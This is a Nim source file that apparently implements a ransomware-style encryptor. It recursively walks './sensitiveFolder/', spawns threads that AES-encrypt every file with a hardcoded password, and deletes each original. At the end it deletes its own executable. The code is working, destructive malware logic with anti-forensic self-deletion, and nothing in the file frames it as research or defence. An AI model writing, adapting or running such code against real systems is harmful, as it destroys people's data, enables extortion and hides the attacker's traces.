import nimAesCrypt
import os
import strenc
import threadpool

# COMPILE: nim --threads:on -d:release c aes.nim

proc EncryptFile(file: string) =
  {.gcsafe.}:
    let password = "THISISACOMPLEXPASSWRD_201334354357"
    let encryptedFile = file & ".aes"
    encryptFile(file, encryptedFile,password,1024)
    removeFile(file)
    echo "File encrypted"


proc fileWalk(path: string){.thread.} =
  for kind, path in walkDir(path):
    case kind:
    of pcFile:
      echo "File: ", path
      spawn EncryptFile(path)
    of pcDir:
      echo "Dir: ", path
      spawn fileWalk(path)
    of pcLinkToFile:
      echo "Link to file: ", path
    of pcLinkToDir:
      echo "Link to dir: ", path


proc main() =
    # if not dirExists("./encryptedFolder/"):
    #     createDir("./encryptedFolder/")
    #     echo "Dir created: ./encryptedFolder/"
    # else:
    #     echo "Dir already exists"
    fileWalk("./sensitiveFolder/")
    sync()

proc selfDeletion() =
  let ownname = getAppFilename()
  echo "Deleting: ", ownname
  removeFile(ownname)

main()

selfDeletion()
